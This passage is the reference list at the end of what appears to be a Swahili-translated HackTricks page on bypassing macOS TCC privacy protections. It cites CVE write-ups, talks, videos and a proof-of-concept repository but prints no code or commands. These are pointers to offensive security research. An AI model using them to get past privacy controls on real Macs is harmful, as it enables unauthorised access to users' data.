- [11] [Vulnerability mpya ya macOS, "powerdir," inaweza kusababisha ufikiaji wa data ya mtumiaji bila idhini](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Badilisha home directory na upite TCC, yaani CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Cheza muziki na upite TCC, yaani CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Jinsi ya kuiba (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Kupita TCC kwa kutumia Telegram kwenye macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Kufichua Vulnerabilities za Apple: Ukaguzi wa diskarbitrationd na storagekitd, Sehemu ya 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Kuweka environment variables kwenye OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass na privilege escalation](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass kwa ku-mount juu ya TCC database](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Njia 20+ za Kupita Privacy Mechanisms za macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Ushindi Mkubwa Dhidi ya TCC - Njia MPYA 20+ za Kupita Privacy Mechanisms za MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
